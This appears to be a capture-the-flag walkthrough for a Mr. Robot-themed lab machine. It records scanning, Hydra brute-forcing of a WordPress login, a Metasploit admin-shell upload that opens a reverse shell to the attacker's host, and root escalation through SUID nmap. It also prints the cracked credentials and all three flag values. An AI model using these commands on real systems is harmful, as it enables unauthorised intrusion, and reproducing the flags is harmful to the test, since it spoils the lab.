url=192.168.1.1
# Enumeration

## Port scan
```sh
nmap -p- $url
```

Output:
```text
Nmap scan report for 192.168.1.1
Host is up (0.043s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
```

## Web Enumeration
```sh
feroxbuster -u http://$url:80 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -An
```

```text
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.1.1:80
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       24w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET      137l      464w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        0l        0w        0c http://192.168.1.1/sitemap
200      GET        1l      155w     8638c http://192.168.1.1/css/A.main-600a9791.css.pagespeed.cf.u3LLEOFQmH.css
200      GET       30l       98w     1188c http://192.168.1.1/index.html
301      GET        7l       20w      234c http://192.168.1.1/images => http://192.168.1.1/images/
301      GET        7l       20w      232c http://192.168.1.1/blog => http://192.168.1.1/blog/
200      GET       61l      849w    50555c http://192.168.1.1/js/s_code.js.pagespeed.jm.I78cfHQpbQ.js
301      GET        0l        0w        0c http://192.168.1.1/rss => http://192.168.1.1/feed/
302      GET        0l        0w        0c http://192.168.1.1/login => http://192.168.1.1/wp-login.php
200      GET        1l     2254w   182004c http://192.168.1.1/js/vendor/vendor-48ca455c.js.pagespeed.jm.V7Qfw6bd5C.js
200      GET      820l     6033w   239300c http://192.168.1.1/js/main-acba06a5.js.pagespeed.jm.YdSb2z1rih.js
200      GET       30l       98w     1188c http://192.168.1.1/
301      GET        7l       20w      233c http://192.168.1.1/video => http://192.168.1.1/video/
301      GET        0l        0w        0c http://192.168.1.1/0 => http://192.168.1.1/0/
301      GET        0l        0w        0c http://192.168.1.1/feed => http://192.168.1.1/feed/
301      GET        0l        0w        0c http://192.168.1.1/image => http://192.168.1.1/image/
301      GET        0l        0w        0c http://192.168.1.1/atom => http://192.168.1.1/feed/atom/
301      GET        7l       20w      238c http://192.168.1.1/wp-content => http://192.168.1.1/wp-content/
301      GET        7l       20w      233c http://192.168.1.1/admin => http://192.168.1.1/admin/
301      GET        7l       20w      233c http://192.168.1.1/audio => http://192.168.1.1/audio/
200      GET     2028l    11941w   936742c http://192.168.1.1/intro
200      GET        1l      248w     6048c http://192.168.1.1/wp-includes/css/buttons.min.css,qver=4.3.1.pagespeed.ce.ZQERzcrubG.css
301      GET        7l       20w      231c http://192.168.1.1/css => http://192.168.1.1/css/
200      GET        1l      688w    24200c http://192.168.1.1/wp-admin/css/login.min.css
200      GET        1l       10w    46120c http://192.168.1.1/wp-includes/css/dashicons.min.css,qver=4.3.1.pagespeed.ce.5l-W1PUiez.css
200      GET       53l      158w     2657c http://192.168.1.1/wp-login.php
302      GET        0l        0w        0c http://192.168.1.1/wp-admin/ => http://192.168.1.1/wp-login.php?redirect_to=http%3A%2F%2F192.168.1.1%2Fwp-admin%2F&reauth=1
200      GET       53l      158w     2657c http://192.168.1.1/wp-login
301      GET        0l        0w        0c http://192.168.1.1/rss2 => http://192.168.1.1/feed/
200      GET      156l       27w      309c http://192.168.1.1/license
301      GET        7l       20w      239c http://192.168.1.1/wp-includes => http://192.168.1.1/wp-includes/
301      GET        7l       20w      230c http://192.168.1.1/js => http://192.168.1.1/js/
301      GET        0l        0w        0c http://192.168.1.1/Image => http://192.168.1.1/Image/
301      GET        0l        0w        0c http://192.168.1.1/rdf => http://192.168.1.1/feed/rdf/
301      GET        0l        0w        0c http://192.168.1.1/page1 => http://192.168.1.1/
200      GET        1l       14w       64c http://192.168.1.1/readme
200      GET        3l        4w       41c http://192.168.1.1/robots
302      GET        0l        0w        0c http://192.168.1.1/dashboard => http://192.168.1.1/wp-admin/
301      GET        0l        0w        0c http://192.168.1.1/%20 => http://192.168.1.1/
404      GET        5l       15w      135c http://192.168.1.1/wp-trackback
```

### Intresting sites

$url/admin, just reloads everytime so not intresting

$url/login more intresting in next point

$url/robots
User-agent: *
fsocity.dic -> wordlist for cracking, downloaded to wordlist.txt
key-1-of-3.txt -> First key (073403c8a58a1f80d943455fb30724b9)

$url/license -> has base64 encoded a user/passwd = ZWxsaW90OkVSMjgtMDY1Mgo= -> elliot:ER28-0652



# Brute forcing

Takes pretty long, as the password is the ninth last of the fsocity.dic list.
## Username
```sh
hydra -L wordlist.txt -p dummyPassword $url http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.1.1%2Fwp-admin%2F&testcookie=1:F=Invalid username." -V
```

Username: elliot

## Password
```sh
hydra -l elliot -P wordlist.txt $url http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.1.1%2Fwp-admin%2F&testcookie=1:F=ERROR" -V
```


Passwort: ER28-0652

# Revshell

use  unix/webapp/wp_admin_shell_upload
set RHOSTS $url
set USERNAME elliot
set PASSWORD ER28-0652
set LHOST 192.168.1.158
set WPCHECK false
run

Doesn't work cause request doesn't come from `192.168.1.1`, but from `192.168.2.69`.
So this command achieves that, the traffic is routed back to 192.168.1.1:
```sh
sudo ip route add 192.168.2.69 dev eth1 via 192.168.1.1
```

then run again.
get revshell as daemon user


# Privesc
## To better user robot
cd /hom/robot
read password.raw-md5
crack with [online tool](https://crackstation.net)

Password for robot user: abcdefghijklmnopqrstuvwxyz

user key: 822c73956184f694993bede3eb39f959
## To root
To find all files owned by root and which have the sbit set
```sh
find / -user root -perm /4000 2>/dev/null
```

nmap has it set

with 
```sh
nmap --interactive
nmap>!sh
```

You are root
last key:
04787ddef27c3dee1ee161b21670b4e4